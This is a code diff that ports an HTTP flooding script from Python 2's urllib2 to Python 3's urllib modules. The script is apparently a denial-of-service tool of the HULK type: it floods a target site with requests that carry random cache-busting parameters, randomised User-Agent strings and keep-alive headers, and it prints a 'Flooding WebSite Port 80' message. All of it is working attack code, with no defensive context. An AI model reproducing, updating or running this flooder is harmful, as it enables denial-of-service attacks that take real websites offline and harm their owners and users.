@@ -1,4 +1,5 @@
-import urllib2
+import urllib.request
+import urllib.error
 import sys
 import threading
 import random
@@ -123,7 +124,7 @@ def httpcall(url):
 		param_joiner = "&"
 	else:
 		param_joiner = "?"
-	request = urllib2.Request(url + param_joiner + buildblock(
+	request = urllib.request.Request(url + param_joiner + buildblock(
 		random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
@@ -134,18 +135,18 @@ def httpcall(url):
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host', host)
 	try:
-		urllib2.urlopen(request)
-	except urllib2.HTTPError:
+		urllib.request.urlopen(request)
+	except urllib.error.HTTPError:
 		#print e.code
 		set_flag(1)
 		print('Flooding WebSite Port 80 with 65000-byte packets for 99999')
 		code = 500
-	except urllib2.URLError:
+	except urllib.error.URLError:
 		#print e.reason
 		sys.exit()
 	else:
 		inc_counter()
-		urllib2.urlopen(request)
+		urllib.request.urlopen(request)
 	return(code)
 
 
